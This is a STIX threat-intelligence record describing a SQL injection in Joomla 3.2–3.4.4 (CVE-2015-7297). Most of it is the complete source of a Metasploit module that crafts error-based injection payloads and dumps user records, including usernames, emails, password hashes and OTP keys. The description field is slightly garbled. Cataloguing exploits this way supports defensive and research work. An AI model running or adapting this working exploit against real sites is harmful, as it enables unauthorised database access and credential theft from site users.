{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9699deb-e80c-46d6-83ed-1b2d312f3501",
    "created": "2024-08-14T16:31:26.843151Z",
    "modified": "2024-08-14T16:31:26.843155Z",
    "name": "Joomla com_contenthistory Error-Based SQL Injection",
    "description": " This module exploits a SQL injection vulnerability in Joomla versions 3.2 through 3.4.4 in order to either enumerate usernames and password hashes.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/joomla_contenthistory_sqli.rb",
            "external_id": "joomla_contenthistory_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/joomla-sql-injection-vulnerability-exploit-results-in-full-administrative-access/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability in Joomla versions 3.2\n        through 3.4.4 in order to either enumerate usernames and password hashes.\n      },\n      'References'     =>\n        [\n          ['CVE', '2015-7297'],\n          ['URL', 'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/joomla-sql-injection-vulnerability-exploit-results-in-full-administrative-access/']\n        ],\n      'Author'         =>\n        [\n          'Asaf Orpani', # discovery\n          'bperry',      # metasploit module\n          'Nixawk'       # module review\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2015-10-22'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])\n      ])\n  end\n\n  def check\n    flag = Rex::Text.rand_text_alpha(8)\n    lmark = Rex::Text.rand_text_alpha(5)\n    rmark = Rex::Text.rand_text_alpha(5)\n\n    payload = 'AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT('\n    payload << \"0x#{lmark.unpack('H*')[0]},\"\n    payload << \"(SELECT 0x#{flag.unpack('H*')[0]}),\"\n    payload << \"0x#{rmark.unpack('H*')[0]},\"\n    payload << 'FLOOR(RAND(0)*2)'\n    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'\n\n    res = sqli(payload)\n\n    if res && res.code == 500 && res.body =~ /#{lmark}#{flag}#{rmark}/\n      Msf::Exploit::CheckCode::Vulnerable\n    else\n      Msf::Exploit::CheckCode::Safe\n    end\n  end\n\n  def request(query, payload, lmark, rmark)\n    query = \"#{payload}\" % query\n    res = sqli(query)\n\n    # Error based SQL Injection\n    if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/\n      $1\n    end\n  end\n\n  def query_databases(payload, lmark, rmark)\n    dbs = []\n\n    query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '\n    query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'\n\n    dbc = request(query, payload, lmark, rmark)\n\n    query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '\n    query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'\n\n    0.upto(dbc.to_i - 1) do |i|\n      dbname = request(query_fmt % i, payload, lmark, rmark)\n      dbs << dbname\n      vprint_good(dbname)\n    end\n\n    %w(performance_schema information_schema mysql).each do |dbname|\n      dbs.delete(dbname) if dbs.include?(dbname)\n    end\n\n    dbs\n  end\n\n  def query_tables(database, payload, lmark, rmark)\n    tbs = []\n\n    query = '(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) '\n    query << 'FROM INFORMATION_SCHEMA.TABLES '\n    query << \"WHERE table_schema IN (0x#{database.unpack('H*')[0]}))\"\n\n    tbc = request(query, payload, lmark, rmark)\n\n    query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '\n    query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '\n    query_fmt << \"WHERE table_schema IN (0x#{database.unpack('H*')[0]}) \"\n    query_fmt << 'LIMIT %d,1)'\n\n    vprint_status('tables in database: %s' % database)\n    0.upto(tbc.to_i - 1) do |i|\n      tbname = request(query_fmt % i, payload, lmark, rmark)\n      vprint_good(tbname)\n      tbs << tbname if tbname =~ /_users$/\n    end\n\n    tbs\n  end\n\n  def query_columns(database, table, payload, lmark, rmark)\n    cols = []\n    query = \"(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})\"\n\n    colc = request(query, payload, lmark, rmark)\n    vprint_status(colc)\n\n    valid_cols = [   # joomla_users\n      'activation',\n      'block',\n      'email',\n      'id',\n      'lastResetTime',\n      'lastvisitDate',\n      'name',\n      'otep',\n      'otpKey',\n      'params',\n      'password',\n      'registerDate',\n      'requireReset',\n      'resetCount',\n      'sendEmail',\n      'username'\n    ]\n\n    query_fmt = '(SELECT MID((IFNULL(CAST(%s AS CHAR),0x20)),%d,54) '\n    query_fmt << \"FROM #{database}.#{table} ORDER BY id LIMIT %d,1)\"\n\n    0.upto(colc.to_i - 1) do |i|\n      record = {}\n      valid_cols.each do |col|\n        l = 1\n        record[col] = ''\n        loop do\n          value = request(query_fmt % [col, l, i], payload, lmark, rmark)\n          break if value.blank?\n          record[col] << value\n          l += 54\n        end\n      end\n      cols << record\n      vprint_status(record.to_s)\n    end\n\n    cols\n  end\n\n  def run\n    lmark = Rex::Text.rand_text_alpha(5)\n    rmark = Rex::Text.rand_text_alpha(5)\n\n    payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('\n    payload << \"0x#{lmark.unpack('H*')[0]},\"\n    payload << '%s,'\n    payload << \"0x#{rmark.unpack('H*')[0]},\"\n    payload << 'FLOOR(RAND(0)*2)'\n    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'\n\n    dbs = query_databases(payload, lmark, rmark)\n    dbs.each do |db|\n      tables = query_tables(db, payload, lmark, rmark)\n      tables.each do |table|\n        cols = query_columns(db, table, payload, lmark, rmark)\n        next if cols.blank?\n        path = store_loot(\n          'joomla.users',\n          'text/plain',\n          datastore['RHOST'],\n          cols.to_json,\n          'joomla.users')\n        print_good('Saved file to: ' + path)\n      end\n    end\n  end\n\n  def sqli(payload)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        'option' => 'com_contenthistory',\n        'view' => 'history',\n        'list[ordering]' => '',\n        'item_id' => 1,\n        'type_id' => 1,\n        'list[select]' => '1 ' + payload\n      }\n    )\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-10-22"
}